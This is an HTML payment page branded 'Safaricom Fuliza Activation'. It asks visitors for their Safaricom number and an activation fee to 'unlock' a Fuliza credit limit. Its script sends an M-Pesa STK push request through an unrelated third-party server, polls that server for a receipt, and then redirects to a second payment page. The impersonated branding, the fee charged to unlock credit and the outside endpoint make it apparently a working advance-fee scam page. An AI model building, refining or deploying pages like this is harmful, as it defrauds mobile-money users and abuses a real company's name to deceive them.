<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activate Your Fuliza Limit</title>

<style>
body{font-family:Arial;background:#f4f6f9;margin:0}
.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px}
.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center}
.info{margin:10px 0;font-size:16px}
input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px}
.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer}
.pay-btn:hover{background:#179937}
.spinner{margin-top:15px;display:none}
.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.message{margin-top:15px;font-size:14px}
.encourage{margin-top:20px;font-size:14px;color:#555}
</style>
</head>

<body>

<header class="top-bar">Safaricom Fuliza Activation</header>

<div class="payment-box">

<h2>Activate Your Fuliza Limit Now</h2>

<p class="encourage">
Complete the activation payment to unlock your Fuliza limit instantly.
</p>

<div class="info">Selected Limit: <strong id="limit"></strong></div>
<div class="info">Activation Fee: <strong id="fee"></strong></div>

<input type="tel" id="phone" placeholder="Enter Safaricom Number">

<button class="pay-btn" id="payBtn" onclick="payNow()">Pay Activation Fee</button>

<div class="spinner" id="spinner"><div class="loader"></div></div>
<div class="message" id="message"></div>

</div>

<script>

const API="https://mpayafrica-server.onrender.com"

const selectedAmount=localStorage.getItem("selectedAmount") || "5000"
const activationFee=localStorage.getItem("activationFee") || "50"

document.getElementById("limit").innerText="KSh "+selectedAmount
document.getElementById("fee").innerText="KSh "+activationFee

function isSafaricom(num){
return /^(07|01)[0-9]{8}$/.test(num) || /^2547[0-9]{8}$/.test(num)
}

function formatPhone(num){
if(num.startsWith("07") || num.startsWith("01")){
return "254"+num.substring(1)
}
return num
}

async function payNow(){

const phone=document.getElementById("phone").value.trim()
const msg=document.getElementById("message")
const spinner=document.getElementById("spinner")
const btn=document.getElementById("payBtn")

if(!phone){
msg.innerText="Enter phone number"
msg.style.color="red"
return
}

if(!isSafaricom(phone)){
msg.innerText="Only Safaricom numbers allowed"
msg.style.color="red"
return
}

btn.disabled=true
spinner.style.display="block"

const phoneFormatted=formatPhone(phone)

try{

const res=await fetch(API+"/stkpush",{

method:"POST",
headers:{"Content-Type":"application/json"},

body:JSON.stringify({
phone:phoneFormatted,
amount:Number(activationFee),
reference:"FZA"+Date.now()
})

})

const data=await res.json()

spinner.style.display="none"

if(data.success){

msg.innerText="STK Push sent. Enter your M-Pesa PIN."
msg.style.color="green"

checkPayment(data.reference)

}else{

msg.innerText="Payment request failed. Please retry."
msg.style.color="red"
btn.disabled=false

}

}catch(e){

spinner.style.display="none"
msg.innerText="Connection error. Please retry."
msg.style.color="red"
btn.disabled=false

}

}

async function checkPayment(reference){

const msg=document.getElementById("message")

let attempts=0

const interval=setInterval(async()=>{

attempts++

if(attempts>25){

clearInterval(interval)
msg.innerText="Payment verification timeout. Please try again."
msg.style.color="red"
document.getElementById("payBtn").disabled=false
return

}

try{

const res=await fetch(API+"/receipt/"+reference)
const data=await res.json()

if(data.success){

const status=data.receipt.status

if(status==="success"){

clearInterval(interval)

msg.innerText="Payment successful. Redirecting..."
msg.style.color="green"

setTimeout(()=>{
window.location.href="payment2.html"
},2000)

}

if(status==="failed"){

clearInterval(interval)

msg.innerText="Payment failed or cancelled."
msg.style.color="red"

document.getElementById("payBtn").disabled=false

}

}

}catch(e){}

},3000)

}

</script>

</body>
</html>
